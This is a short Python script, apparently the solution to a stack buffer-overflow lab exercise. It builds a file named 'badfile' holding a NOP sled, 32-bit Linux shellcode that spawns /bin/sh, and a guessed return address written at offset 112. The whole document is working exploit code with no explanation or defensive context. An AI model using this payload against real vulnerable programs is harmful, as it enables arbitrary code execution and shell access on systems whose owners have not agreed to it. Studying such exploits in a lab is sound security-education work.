shellcode = bytearray([
  0x31,
  0xc0,
  0x50,
  0x68,
  0x2f,
  0x2f,
  0x73,
  0x68,
  0x68,
  0x2f,
  0x62,
  0x69,
  0x6e,
  0x89,
  0xe3,
  0x50,
  0x53,
  0x89,
  0xe1,
  0x99,
  0xb0,
  0x0b,
  0xcd,
  0x80
])

# Fill the content with NOPs
content = bytearray(0x90 for i in range(300))

# put the shellcode at the end
start = 300 - len(shellcode)
content[start:] = shellcode

# put the address at offset 112
ret = 0xbffff128 + 120
content[112:116] = (ret).to_bytes(4, byteorder='little')

# Write the content to a file
with open('badfile', 'wb') as f :
  f.write(content)